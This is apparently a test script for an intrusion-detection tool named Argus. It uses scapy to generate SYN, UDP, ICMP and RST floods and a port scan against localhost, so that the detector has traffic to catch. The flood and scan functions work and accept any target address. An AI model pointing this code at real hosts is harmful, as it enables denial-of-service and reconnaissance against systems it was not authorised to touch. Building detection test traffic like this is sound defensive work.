# tests/attack_simulator.py
# ─────────────────────────────────────────
# ARGUS — Attack Simulator
# Simulates real attacks so Argus detects them
# ─────────────────────────────────────────

from scapy.all import *
import time
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [SIMULATOR] %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger(__name__)

TARGET    = "127.0.0.1"
INTERFACE = r"\Device\NPF_Loopback"   # Loopback = localhost attacks


# ─────────────────────────────────────────
# Attack 1 — SYN Flood (DoS)
# ─────────────────────────────────────────
def syn_flood(target=TARGET, port=80, count=200):
    logger.info(f"🔴 Starting SYN Flood → {target}:{port} ({count} packets)")
    for i in range(count):
        pkt = IP(dst=target) / TCP(
            sport=RandShort(),
            dport=port,
            flags="S"
        )
        send(pkt, iface=INTERFACE, verbose=0)
        if i % 50 == 0:
            logger.info(f"   Sent {i}/{count} SYN packets...")
        time.sleep(0.01)
    logger.info("✅ SYN Flood complete!")


# ─────────────────────────────────────────
# Attack 2 — Port Scan (Probe)
# ─────────────────────────────────────────
def port_scan(target=TARGET):
    logger.info(f"🟡 Starting Port Scan → {target}")
    common_ports = [
        21, 22, 23, 25, 53, 80, 110, 135,
        139, 143, 443, 445, 3306, 3389,
        5432, 6379, 8000, 8080, 8443, 9200
    ]
    for port in common_ports:
        pkt = IP(dst=target) / TCP(
            sport=RandShort(),
            dport=port,
            flags="S"
        )
        send(pkt, iface=INTERFACE, verbose=0)
        time.sleep(0.05)
        logger.info(f"   Probing port {port}...")
    logger.info(f"✅ Port Scan complete! Scanned {len(common_ports)} ports")


# ─────────────────────────────────────────
# Attack 3 — UDP Flood (DoS variant)
# ─────────────────────────────────────────
def udp_flood(target=TARGET, port=53, count=150):
    logger.info(f"🔴 Starting UDP Flood → {target}:{port} ({count} packets)")
    for i in range(count):
        pkt = IP(dst=target) / UDP(
            sport=RandShort(),
            dport=port
        ) / Raw(load="X" * 512)
        send(pkt, iface=INTERFACE, verbose=0)
        if i % 50 == 0:
            logger.info(f"   Sent {i}/{count} UDP packets...")
        time.sleep(0.01)
    logger.info("✅ UDP Flood complete!")


# ─────────────────────────────────────────
# Attack 4 — ICMP Flood (Ping Flood)
# ─────────────────────────────────────────
def icmp_flood(target=TARGET, count=100):
    logger.info(f"🟡 Starting ICMP Flood → {target} ({count} packets)")
    for i in range(count):
        pkt = IP(dst=target) / ICMP() / Raw(load="A" * 64)
        send(pkt, iface=INTERFACE, verbose=0)
        if i % 25 == 0:
            logger.info(f"   Sent {i}/{count} ICMP packets...")
        time.sleep(0.02)
    logger.info("✅ ICMP Flood complete!")


# ─────────────────────────────────────────
# Attack 5 — RST Flood
# ─────────────────────────────────────────
def rst_flood(target=TARGET, port=80, count=100):
    logger.info(f"🔴 Starting RST Flood → {target}:{port}")
    for i in range(count):
        pkt = IP(dst=target) / TCP(
            sport=RandShort(),
            dport=port,
            flags="R"
        )
        send(pkt, iface=INTERFACE, verbose=0)
        time.sleep(0.01)
    logger.info("✅ RST Flood complete!")


# ─────────────────────────────────────────
# Full Demo Sequence
# ─────────────────────────────────────────
def run_full_demo():
    print("\n" + "═" * 60)
    print("  ARGUS ATTACK SIMULATOR — DEMO MODE")
    print("  Make sure Argus is running and capturing!")
    print("  Watch the dashboard at http://localhost:5173")
    print("═" * 60)

    attacks = [
        ("1/5 — SYN Flood (DoS)",   lambda: syn_flood(count=200)),
        ("2/5 — Port Scan (Probe)", lambda: port_scan()),
        ("3/5 — UDP Flood (DoS)",   lambda: udp_flood(count=150)),
        ("4/5 — ICMP Flood",        lambda: icmp_flood(count=100)),
        ("5/5 — RST Flood",         lambda: rst_flood(count=100)),
    ]

    for name, attack_fn in attacks:
        print(f"\n{'─' * 50}")
        print(f"  🚀 Launching: {name}")
        print(f"{'─' * 50}")
        attack_fn()
        print(f"\n  ⏳ Pausing 10 seconds before next attack...")
        time.sleep(10)

    print("\n" + "═" * 60)
    print("  ✅ All attacks complete!")
    print("  Check your Argus dashboard for detections!")
    print("═" * 60)


# ─────────────────────────────────────────
# Menu
# ─────────────────────────────────────────
if __name__ == "__main__":
    print("\n" + "═" * 60)
    print("  ARGUS ATTACK SIMULATOR")
    print("═" * 60)
    print("  1. SYN Flood   (DoS attack)")
    print("  2. Port Scan   (Probe attack)")
    print("  3. UDP Flood   (DoS variant)")
    print("  4. ICMP Flood  (Ping flood)")
    print("  5. RST Flood")
    print("  6. Run ALL attacks (Full Demo)")
    print("═" * 60)

    choice = input("\n  Choose [1-6]: ").strip()

    if   choice == "1": syn_flood()
    elif choice == "2": port_scan()
    elif choice == "3": udp_flood()
    elif choice == "4": icmp_flood()
    elif choice == "5": rst_flood()
    elif choice == "6": run_full_demo()
    else: print("Invalid choice!")